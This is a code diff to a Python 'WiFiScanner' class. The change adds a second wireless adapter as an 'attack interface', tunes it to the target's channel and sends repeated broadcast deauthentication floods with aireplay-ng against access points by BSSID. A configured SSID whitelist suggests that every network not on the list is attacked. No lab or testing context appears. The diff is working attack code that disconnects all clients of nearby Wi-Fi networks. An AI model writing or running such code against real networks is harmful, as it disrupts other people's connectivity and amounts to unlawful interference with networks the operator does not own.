@@ -30,8 +30,10 @@ class WiFiScanner:
         if not detected:
             raise Exception("No external WiFi adapter found!")
         
-        self.interface = detected[0]  # Use first external adapter
+        self.interface = detected[0]  # Use first external adapter (monitor)
+        self.attack_interface = detected[1] if len(detected) >= 2 else detected[0]  # Use second adapter for attack if available
         logger.info(f"Using WiFi interface: {self.interface}")
+        logger.info(f"Using attack interface: {self.attack_interface}")
         
         self.whitelist_ssids = set(config['whitelist']['ssids'])
         self.running = False
@@ -399,6 +401,14 @@ class WiFiScanner:
         try:
             logger.info(f"💥 Sending deauth to {ssid}...")
             
+            # Set attack interface to correct channel
+            try:
+                subprocess.run(['iw', 'dev', self.attack_interface, 'set', 'channel', str(channel)],
+                             capture_output=True, timeout=5)
+                logger.debug(f"Set {self.attack_interface} to channel {channel}")
+            except Exception as e:
+                logger.warning(f"Could not set channel on attack interface: {e}")
+            
             # Send deauth packets to broadcast (all clients)
             # --deauth: number of deauth packets to send (increased to 20 for better coverage)
             # -a: AP MAC address
@@ -407,7 +417,7 @@ class WiFiScanner:
                 'aireplay-ng',
                 '--deauth', '20',
                 '-a', bssid,
-                self.interface
+                self.attack_interface  # Use attack interface for deauth
             ], capture_output=True, text=True, timeout=30)
             
             if result.returncode == 0:
@@ -422,7 +432,7 @@ class WiFiScanner:
                     'aireplay-ng',
                     '--deauth', '20',
                     '-a', bssid,
-                    self.interface
+                    self.attack_interface  # Use attack interface for follow-up deauth
                 ], capture_output=True, text=True, timeout=30)
                 if result2.returncode == 0:
                     logger.info(f"✓ Follow-up deauth sent to {ssid}")
